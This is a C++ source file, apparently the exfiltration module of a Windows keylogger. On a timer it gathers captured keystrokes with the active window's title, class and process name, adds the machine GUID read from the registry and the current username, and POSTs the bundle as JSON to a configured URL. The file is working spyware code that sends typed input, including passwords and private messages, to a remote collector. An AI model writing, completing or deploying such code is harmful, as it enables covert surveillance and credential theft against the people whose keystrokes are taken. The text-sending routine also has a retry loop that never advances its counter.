#include "transmiter_http.h"
#include "log_node.h"
#include <fstream>
#include <iostream>
#include <thread>
#include <chrono>



 TransmiterHTTP::TransmiterHTTP(std::vector<std::unique_ptr<LogNode>>& log_nodes,
	 LogNode& active_node_observator, std::mutex& mutex):
	 log_nodes_(log_nodes), active_node(active_node_observator),
	 mutex_(mutex){
	 bool checek = false;
	}
 


 bool TransmiterHTTP::start()
 {
	 if (this->url_ == "") return false;
	 this->running_ = true;
	

	 this->save_machine_guid_();
	 transmiter_thread_ = std::thread(&TransmiterHTTP::run_, this);
	 return true;
 }

 void TransmiterHTTP::stop() {
	 running_ = false;
	 if (transmiter_thread_.joinable()) {
		 transmiter_thread_.join();
	 }
 }

 void TransmiterHTTP::set_conf(std::string url, int retries, int frequency)
 {
	 this->url_ = url;
	 this->retries_ = retries;
	 this->transmit_frequency_ = frequency;
 }


 cpr::Response TransmiterHTTP::send_post_text(const std::string& data, const std::string & url)
 {
	 int retry_timeout = 0;
	 int retry_counter = 1;
	 cpr::Response res;
	 while (retry_counter <= retries_) {
		 res = cpr::Post(
			 cpr::Url(url),
			 cpr::Header{ {"Content-Type", "text/plain"}},
			 cpr::Body(data),
			 cpr::Timeout(4000)
		 );
		 if (res.status_code >= 200 && res.status_code < 300) return res;
		
		 retry_timeout = static_cast<int>((retry_counter / 5 + 1) * this->transmit_frequency_);
		 std::this_thread::sleep_for(std::chrono::seconds(retry_timeout));
	 }

	 return res;
 }

 cpr::Response TransmiterHTTP::send_post_json(const std::string& data, const std::string& url)
 {
	 int retry_timeout = 0;
	 int retry_counter = 1;
	 cpr::Response res;
	 while (retry_counter <= retries_) {
		 res = cpr::Post(
			 cpr::Url(url),
			 cpr::Header{ {"Content-Type", "application/json"} },
			 cpr::Body(data),
			 cpr::Timeout(4000)
		 );
		 if (res.status_code >= 200 && res.status_code < 300) return res;

		 retry_timeout = static_cast<int>((retry_counter / 5 + 1) * this->transmit_frequency_);
		 std::this_thread::sleep_for(std::chrono::seconds(retry_timeout));
		 retry_counter += 1;
	 }

	 return res;
 }


 void TransmiterHTTP::run_()
 {
	 SetThreadDescription(GetCurrentThread(), L"Transmitter");
	 while (running_) {
		 this->transmit_();

		 std::this_thread::sleep_for(std::chrono::seconds(this->transmit_frequency_));
	 }
 }

 void TransmiterHTTP::transmit_() {
	 std::string json_package;

	 std::vector<std::unique_ptr<LogNode>> temp_buffer;
	 {
		 std::lock_guard<std::mutex> lock(this->mutex_);

		 if (this->log_nodes_.empty() ||
			  (this->log_nodes_.size() == 1 && (*this->log_nodes_.back()).keystrokes == "")) return;

		 this->swap_buffers_(temp_buffer);
	 }
	 this->save_username_();
	 json_package = this->pack_data_to_json_(temp_buffer);
	 this->send_post_json(json_package, this->url_);
 }

 bool TransmiterHTTP::swap_buffers_(std::vector<std::unique_ptr<LogNode>>& temp_buffer)
 {
	 this->active_node.keystrokes = "";
	 this->log_nodes_.swap(temp_buffer);
	 this->log_nodes_.push_back(std::make_unique<LogNode>(this->active_node));
	 return true;
 }

 void TransmiterHTTP::save_machine_guid_()
 {
	 wchar_t buffer[40];
	 DWORD b_size = sizeof(buffer);
	 LSTATUS result = RegGetValueW(
		 HKEY_LOCAL_MACHINE,
		 L"SOFTWARE\\Microsoft\\Cryptography",
		 L"MachineGuid",
		 RRF_RT_REG_SZ,
		 NULL,
		 buffer,
		 &b_size);
	 if (result == ERROR_SUCCESS) this->machine_guid_ = convert_to_utf8(buffer);
	 else this->machine_guid_ = "[UNKNOWN]";
 }


 std::string TransmiterHTTP::convert_to_utf8(wchar_t* data)
 {
	 if (data == nullptr || data[0] == L'\0') {
		 return std::string();
	 }

	 int size_needed = WideCharToMultiByte(CP_UTF8, 0, data, -1, NULL, 0, NULL, NULL);

	 if (size_needed <= 0) {
		 return std::string();
	 }

	 std::string result(size_needed - 1, 0); // -1 bo nie chcemy null terminatora
	 WideCharToMultiByte(CP_UTF8, 0, data, -1, &result[0], size_needed, NULL, NULL);

	 return result;
 }

 void TransmiterHTTP::save_username_()
 {
	 DWORD b_size = 256;
	 wchar_t buffer[256];
	 BOOL result = GetUserNameW(buffer, &b_size);
	 if (result) this->username_ = convert_to_utf8(buffer);
	 else this->username_ = "[UNKNOWN]";
 }


 std::string TransmiterHTTP::pack_data_to_json_(std::vector<std::unique_ptr<LogNode>>& data_buffer)
 {
	 std::string o_json = "";
	 std::unique_ptr<LogNode> log;
	 std::string comma = ",";

	 std::string guid = escape_json_(this->machine_guid_);
	 std::string username = escape_json_(this->username_);

	 o_json += std::vformat(R"(
	{{
		"computer_info":
		{{
			"machine_guid": "{}",
			"username": "{}"
		}},
		"logs_data": [
		 
	 )", std::make_format_args(guid, username));

	 bool first = true;

	 while (!data_buffer.empty()) {
		 log = std::move(data_buffer.back());
		 data_buffer.pop_back();

		 if (log->keystrokes == "") continue;

		 std::string w_title = this->escape_json_(log->window_info.title);
		 std::string w_class = this->escape_json_(log->window_info.class_name);
		 std::string w_procces = this->escape_json_(log->window_info.process);
		 std::string time = this->escape_json_(log->time);
		 std::string keystrokes = this->escape_json_(log->keystrokes);
		
		 if (first == false) o_json += ",";
		 first = false;
		 //comma = data_buffer.empty() ? "" : ",";
		 o_json += std::vformat(R"(
			{{
				"window_info": {{
					"title": "{}",
					"class_name": "{}",
					"process_name": "{}"
				}},
				"timestamp": "{}",
				"keystrokes": "{}"
			}}
		 )", std::make_format_args(w_title, w_class, w_procces, time, keystrokes));
	 }
	 o_json += R"(
		]
	}
	)";

	return o_json;
 }

 std::string TransmiterHTTP::escape_json_(std::string s)
 {
	 std::string out;
	 out.reserve(s.size());
	 for (char c : s) {
		 switch (c)
		 {
		 case '\\': out += "\\\\"; break;
		 case '\"': out += "\\\""; break;
		 case '\b': out += "\\b"; break;
		 case '\f': out += "\\f"; break;
		 case '\n': out += "\\n"; break;
		 case '\r': out += "\\r"; break;
		 case '\t': out += "\\t"; break;
		 default:
			 if (static_cast<unsigned char>(c) < 0x20) {
				 char buf[7];
				 sprintf_s(buf, "\\u%04x", c);
				 out += buf;
			 }
			 else out += c;
		 }
	 }
	 return out;
 }
